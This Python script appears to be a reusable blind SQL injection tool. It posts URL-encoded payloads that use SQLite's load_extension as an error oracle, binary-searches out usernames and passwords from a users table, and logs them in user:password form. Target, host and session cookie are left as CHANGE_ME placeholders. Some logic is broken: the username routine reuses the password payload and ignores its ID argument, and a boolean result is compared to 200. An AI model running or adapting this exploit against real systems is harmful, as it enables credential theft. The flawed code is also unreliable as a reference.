import requests

def choose_car(bottom,top):
    return (top+bottom)//2

def make_request_password(char, operator, ind, user):
    url = "CHANGE_ME"

    raw_body = f"CHANGE_ME=injection_point')%3b+SELECT+*+FROM+users+WHERE+1%3d1+AND+CASE+WHEN+SUBSTR((SELECT+password+FROM+users+WHERE+username%3d'{user}'),{ind},1)+{operator}+'{char}'+THEN+1+ELSE+load_extension(1)+END+%3b+--"

    headers = {
        "Host": "CHANGE_ME",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "CHANGE_ME",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "Content-Type": "application/x-www-form-urlencoded", # application/json
    }

    cookies = {
        "PHPSESSID": "CHANGE_ME"
    }

    resp = requests.post(url, data=raw_body, headers=headers, cookies=cookies, allow_redirects=False)

    return resp.status_code == 200

def make_request_user(char, operator, ind, user_id):
    url = "CHANGE_ME"

    raw_body = f"CHANGE_ME=injection_point')%3b+SELECT+*+FROM+users+WHERE+1%3d1+AND+CASE+WHEN+SUBSTR((SELECT+password+FROM+users+WHERE+username%3d'{user}'),{ind},1)+{operator}+'{char}'+THEN+1+ELSE+load_extension(1)+END+%3b+--"

    headers = {
        "Host": "CHANGE_ME",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "CHANGE_ME",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "Content-Type": "application/x-www-form-urlencoded", # application/json
    }

    cookies = {
        "PHPSESSID": "CHANGE_ME"
    }

    resp = requests.post(url, data=raw_body, headers=headers, cookies=cookies, allow_redirects=False)

    return resp.status_code == 200

charset = []

for i in range(48,123,1):
    charset.append(chr(i))

users = []
for user_id in range(5):
    ind = 1
    done = False
    user = ""
    while not done:
        bottom = 0
        top = len(charset)-1
        found = False
        #print("testing for ind",ind)
        #print("------------------")
        while not found:
            char_ind = choose_car(bottom,top)
            char = charset[char_ind]
            if bottom+1 == top or bottom==top:
                operator = "="
            else:
                operator = "<"
            valid = make_request_user(char,operator,ind,user_id)
            #print(f"recieved {code} with {char} and operator {operator} with top={top} and bottom={bottom}")
            #valid = code == 200
            if operator == "<":
                if valid:
                    top = char_ind-1
                else:
                    bottom = char_ind
            else:
                if valid:
                    user += char
                else:
                    final_code = make_request_user(charset[top], operator, ind,user_id)
                    final_valid = final_code == 200
                    if final_valid:
                        user += charset[top]
                        #with open("sqli_users.log","w") as file:
                        #    file.write(user)
                    else:
                        #password += "?"
                        print("had 2 choices left but neither of them were right, guessing we're done here")
                        found = True
                        done = True
                #print("Found new char, user atm:",user)
                found = True
        ind += 1
    print(f"user {user_id} = {user}")
    users.append(user)

with open ("sqli_users.log","w") as file:
    for u in users:
        file.write(u+"\n")

passwords = []
for user in users:
    ind = 1
    done = False
    password = ""
    while not done:
        bottom = 0
        top = len(charset)-1
        found = False
        #print("testing for ind",ind)
        #print("------------------")
        while not found:
            char_ind = choose_car(bottom,top)
            char = charset[char_ind]
            if bottom+1 == top or bottom==top:
                operator = "="
            else:
                operator = "<"
            valid = make_request_password(char,operator,ind,user)
            #print(f"recieved {code} with {char} and operator {operator} with top={top} and bottom={bottom}")
            #valid = code == 200
            if operator == "<":
                if valid:
                    top = char_ind-1
                else:
                    bottom = char_ind
            else:
                if valid:
                    password += char
                else:
                    final_code = make_request_password(charset[top], operator, ind,user)
                    final_valid = final_code == 200
                    if final_valid:
                        password += charset[top]
                        #with open("sqli_passwords.log","w") as file:
                        #    file.write(password)
                    else:
                        #password += "?"
                        print("had 2 choices left but neither of them were right, guessing we're done here")
                        found = True
                        done = True
                #print("Found new char, password atm:",password)
                found = True
        ind += 1
    print(f"{user}:{password}")
    passwords.append(f"{user}:{password}")

with open("sqli_passwords.log","w") as file:
    for up in passwords:
        file.write(up+"\n")